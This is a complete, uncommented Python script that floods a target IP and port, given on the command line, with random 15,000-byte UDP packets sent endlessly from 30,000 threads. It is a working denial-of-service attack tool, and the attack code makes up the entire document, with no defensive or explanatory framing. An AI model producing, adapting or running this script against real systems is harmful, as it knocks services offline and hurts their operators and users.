import sys
import socket
import threading
import random

if len(sys.argv) < 3:
    sys.exit()

TARGET_IP   = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
THREADS     = 30000
PACKET_SIZE = 15000

def attack():
    sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            break

for i in range(THREADS):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    import time
    time.sleep(1)
